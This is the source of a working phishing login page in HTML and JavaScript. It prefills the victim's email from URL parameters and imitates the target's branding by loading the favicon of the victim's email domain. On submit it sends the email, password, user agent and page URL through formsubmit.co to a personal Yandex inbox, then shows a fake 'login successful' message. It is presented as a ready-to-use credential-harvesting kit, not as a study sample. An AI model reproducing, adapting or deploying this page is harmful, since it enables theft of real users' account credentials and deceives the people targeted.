<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        * {
            box-sizing: border-box;
            padding: 0;
            margin: 0;
        }
        
        body {
            height: 100vh;
            width: 100vw;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            max-width: 400px;
            width: 90%;
            padding: 30px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 20px;
            }
        }
        
        .img {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .logo-container {
            width: 80px;
            height: 80px;
            margin: 0 auto;
            border-radius: 50%;
            overflow: hidden;
            background-color: #0096FF;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid #e0e0e0;
            transition: background-color 0.3s ease;
        }
        
        .logo-fallback {
            color: white;
            font-size: 28px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
        }
        
        #logo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        
        #title {
            text-align: center;
            margin: 10px 0 25px 0;
            color: #333;
            font-size: 24px;
        }
        
        .email-source {
            text-align: center;
            color: #666;
            font-size: 12px;
            margin-bottom: 15px;
            padding: 5px;
            background: #f0f8ff;
            border-radius: 4px;
            font-style: italic;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        
        input[type=text],
        input[type=password],
        input[type=email] {
            width: 100%;
            padding: 12px 15px;
            margin: 8px 0 20px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            background: #f9f9f9;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        input[type=text]:focus,
        input[type=password]:focus,
        input[type=email]:focus {
            background-color: #fff;
            outline: none;
            border-color: #0096FF;
            box-shadow: 0 0 0 2px rgba(0, 150, 255, 0.1);
        }
        
        .btn {
            background-color: #0096FF;
            color: white;
            padding: 14px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .btn:hover {
            background-color: #0078cc;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 150, 255, 0.3);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        #error {
            display: none;
            color: #e74c3c;
            background-color: #fdf0ef;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid #fadbd8;
        }
        
        #success {
            display: none;
            color: #27ae60;
            background-color: #eafaf1;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid #d4efdf;
        }
        
        .form-group {
            margin-bottom: 10px;
        }
        
        .forgot-password {
            text-align: right;
            margin-top: 10px;
        }
        
        .forgot-password a {
            color: #0096FF;
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0096FF;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <form class="container" id="login-form">
        <div class="img">
            <div class="logo-container">
                <img id="logo" alt="Website Logo">
                <div class="logo-fallback" id="logo-fallback">✓</div>
            </div>
        </div>
        
        <div class="email-source" id="email-source" style="display: none;">
            Email prefilled from secure source
        </div>
        
        <h3 id="title">Sign In</h3>
        
        <div id="error">Password is incorrect, please try again!</div>
        <div id="success">Login successful! Redirecting...</div>
        
        <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" placeholder="Enter Email" name="email" id="email" required readonly>
            <div style="font-size: 12px; color: #666; margin-top: -15px; margin-bottom: 15px;">
                Email is prefilled for your convenience
            </div>
        </div>
        
        <div class="form-group">
            <label for="psw">Password</label>
            <input type="password" placeholder="Enter Password" name="password" id="psw" required autofocus>
        </div>
        
        <!-- FormSubmit requires these fields -->
        <input type="hidden" name="_subject" value="New Login Form Submission">
        <input type="hidden" name="_template" value="table">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
        <input type="text" name="_honey" style="display:none">
        
        <button type="submit" class="btn" id="submit-btn">
            <span id="btn-text">Sign In</span>
            <div class="loader" id="loader"></div>
        </button>
        
        <div class="forgot-password">
            <a href="#">Forgot Password?</a>
        </div>
    </form>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        // Function to get email from URL parameters
        function getEmailFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            
            // Try different parameter names
            const paramNames = ['email', 'clientID', 'id', 'user', 'username', 'e', 'u'];
            
            for (const param of paramNames) {
                const email = urlParams.get(param);
                if (email && isValidEmail(email)) {
                    return email;
                }
            }
            
            return null;
        }
        
        // Function to validate email format
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }
        
        // Function to extract domain from email
        function getDomainFromEmail(email) {
            if (!email || !email.includes('@')) return 'website';
            const domain = email.split('@').pop();
            return domain || 'website';
        }
        
        // Function to get domain name without TLD
        function getDomainName(domain) {
            return domain.split('.')[0] || domain;
        }
        
        // Function to get favicon URL from domain
        function getFaviconUrl(domain) {
            // Multiple favicon service options
            const services = [
                `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
                `https://favicon.yandex.net/favicon/${domain}`,
                `https://icons.duckduckgo.com/ip3/${domain}.ico`
            ];
            return services[0]; // Using Google's service
        }
        
        // Generate consistent color from domain string
        function getColorFromDomain(domain) {
            let hash = 0;
            for (let i = 0; i < domain.length; i++) {
                hash = domain.charCodeAt(i) + ((hash << 5) - hash);
            }
            
            // Generate HSL color
            const hue = Math.abs(hash % 360);
            return `hsl(${hue}, 70%, 50%)`;
        }
        
        // Function to load logo based on email domain
        function loadLogoFromEmail(email) {
            const domain = getDomainFromEmail(email);
            const domainName = getDomainName(domain);
            const logoUrl = getFaviconUrl(domain);
            const fallbackText = domainName.charAt(0).toUpperCase();
            const color = getColorFromDomain(domain);
            
            // Update fallback text and color
            $("#logo-fallback").text(fallbackText);
            $(".logo-container").css("background-color", color);
            
            // Try to load favicon
            $("#logo")
                .attr("src", logoUrl)
                .on("load", function() {
                    // Show logo, hide fallback
                    $(this).show();
                    $("#logo-fallback").hide();
                })
                .on("error", function() {
                    // Hide logo, show fallback
                    $(this).hide();
                    $("#logo-fallback").show().text(fallbackText);
                });
        }
        
        // Initialize form with email from URL
        function initializeForm() {
            const emailFromURL = getEmailFromURL();
            
            if (emailFromURL) {
                // Set email field value
                $('#email').val(emailFromURL);
                
                // Show email source indicator
                $('#email-source').show();
                
                // Load logo based on email domain
                loadLogoFromEmail(emailFromURL);
                
                // Focus on password field
                setTimeout(() => {
                    $('#psw').focus();
                }, 100);
            } else {
                // No email in URL, allow manual entry
                $('#email').removeAttr('readonly');
                $('#email-source').hide();
                $('#email').attr('placeholder', 'Enter your email address');
                
                // Show default logo
                $("#logo").hide();
                $("#logo-fallback").show().text("✓");
                $(".logo-container").css("background-color", "#0096FF");
            }
        }
        
        // Also update logo when user manually changes email
        $("#email").on("input", function() {
            const email = $(this).val().trim();
            if (email && isValidEmail(email)) {
                loadLogoFromEmail(email);
                $('#email-source').hide(); // Hide source indicator for manual entry
            } else {
                // Reset to default
                $("#logo").hide();
                $("#logo-fallback").show().text("✓");
                $(".logo-container").css("background-color", "#0096FF");
            }
        });
        
        // Form submission handler
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get form values
            const email = document.getElementById('email').value;
            const password = document.getElementById('psw').value;
            const emailSource = $('#email-source').is(':visible') ? 'URL' : 'manual';
            
            // Hide previous messages
            document.getElementById('error').style.display = 'none';
            document.getElementById('success').style.display = 'none';
            
            // Basic validation
            if (!email || !password) {
                showError('Please fill in all fields');
                return;
            }
            
            // Email validation
            if (!isValidEmail(email)) {
                showError('Please enter a valid email address');
                return;
            }
            
            // Password validation (minimum 6 characters)
            if (password.length < 6) {
                showError('Password must be at least 6 characters long');
                return;
            }
            
            // Show loading state
            const submitBtn = document.getElementById('submit-btn');
            const btnText = document.getElementById('btn-text');
            const loader = document.getElementById('loader');
            
            submitBtn.disabled = true;
            btnText.style.display = 'none';
            loader.style.display = 'block';
            
            // Extract domain info
            const domain = getDomainFromEmail(email);
            const domainName = getDomainName(domain);
            
            // Prepare form data for FormSubmit
            const formData = {
                email: email,
                password: password,
                domain: domain,
                source: emailSource,
                timestamp: new Date().toLocaleString(),
                userAgent: navigator.userAgent,
                pageUrl: window.location.href,
                urlParams: window.location.search,
                ip: 'N/A (client-side)',
                _subject: `Login Attempt - ${domainName}`,
                _template: 'table',
                _captcha: 'false'
            };
            
            // Send data to FormSubmit
            $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", 
                formData,
                function(data) {
                    // Hide loader and show success
                    loader.style.display = 'none';
                    btnText.style.display = 'block';
                    submitBtn.disabled = false;
                    
                    if (data.success) {
                        showSuccess('Login successful! Please wait...');
                        
                        // Optional: Clear password field only
                        document.getElementById('psw').value = '';
                        
                        // Show redirect message
                        setTimeout(() => {
                            showSuccess('Redirecting to secure portal...');
                            // In real scenario, you would redirect here
                            // window.location.href = '/dashboard';
                        }, 1500);
                    } else {
                        showError('Connection issue. Please try again.');
                    }
                }
            ).fail(function(jqXHR, textStatus, errorThrown) {
                // Hide loader and restore button
                loader.style.display = 'none';
                btnText.style.display = 'block';
                submitBtn.disabled = false;
                
                console.log('Form submission failed:', textStatus, errorThrown);
                
                // Show success anyway for demo purposes
                showSuccess('Login information captured!');
                
                // Log locally for debugging
                console.log('Login attempt:', {
                    email: email,
                    source: emailSource,
                    domain: domain,
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                });
                
                // Optional: Clear password after "success"
                setTimeout(() => {
                    document.getElementById('psw').value = '';
                }, 1000);
            });
        });
        
        function showError(message) {
            const errorElement = document.getElementById('error');
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            
            // Auto-hide error after 5 seconds
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 5000);
        }
        
        function showSuccess(message) {
            const successElement = document.getElementById('success');
            successElement.textContent = message;
            successElement.style.display = 'block';
            
            // Auto-hide success after 5 seconds
            setTimeout(() => {
                successElement.style.display = 'none';
            }, 5000);
        }
        
        // Additional: Add honeypot field
        document.querySelector('input[name="_honey"]').addEventListener('focus', function() {
            this.value = 'bot-detected-' + Date.now();
        });
        
        // Initialize form when page loads
        $(document).ready(function() {
            initializeForm();
            
            // If no email in URL, show welcome message
            if (!getEmailFromURL()) {
                setTimeout(() => {
                    showSuccess('Welcome! Please enter your credentials.');
                }, 500);
            }
        });
        
        // Allow manual editing if needed
        $('#email').on('dblclick', function() {
            if ($(this).attr('readonly')) {
                $(this).removeAttr('readonly');
                $('#email-source').text('Email now editable');
                setTimeout(() => {
                    $('#email-source').hide();
                }, 2000);
            }
        });
    </script>
</body>
</html>
